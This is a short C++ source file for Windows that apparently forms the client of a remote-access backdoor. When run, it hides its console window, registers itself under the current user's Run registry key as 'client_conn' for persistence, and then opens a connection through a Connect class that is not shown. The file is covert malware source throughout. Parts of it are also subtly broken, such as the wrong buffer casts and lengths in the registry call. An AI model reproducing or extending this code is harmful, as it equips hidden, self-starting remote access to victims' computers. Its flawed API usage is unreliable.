#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include "client.h"
#include "connect.h"
#include <windows.h>

#include <cstdio> 
#include <cstring> 

void Client::start_programm() {
	hide_to_bg();
	load_to_autorun();

	Connect connect;
	connect.establish_connection();
}


void Client::load_to_autorun() {

	std::unique_ptr<char[]> programm_name_temp(new char[MAX_PATH]);
	char* programm_name = programm_name_temp.get();
	GetModuleFileName(NULL, (LPWSTR)programm_name, MAX_PATH);

	HKEY h_reg_key;

	if (RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &h_reg_key, NULL) == ERROR_SUCCESS)
	{
		if (RegSetValueEx(h_reg_key, L"client_conn", NULL, REG_SZ + 1, (LPBYTE)programm_name, sizeof(programm_name)) == ERROR_SUCCESS)
		{
			RegCloseKey(h_reg_key);
		}
		return;
	}
}

void Client::hide_to_bg() {
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);
}

int main() {
	Client client;
	client.start_programm();
}